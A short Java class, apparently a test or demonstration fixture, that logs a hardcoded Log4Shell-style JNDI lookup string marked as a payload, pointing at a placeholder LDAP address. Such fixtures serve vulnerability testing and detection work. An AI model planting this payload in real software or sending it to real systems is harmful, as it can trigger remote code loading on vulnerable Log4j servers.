package example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;

public class ReflectiveLogging {

    private static Logger logger = LogManager.getLogger(ReflectiveLogging.class);

    public static void reflectiveLogging(String message) throws IOException {
        // payload
        logger.error("${jndi:ldap://0.0.0.0:8000}");
    }
}
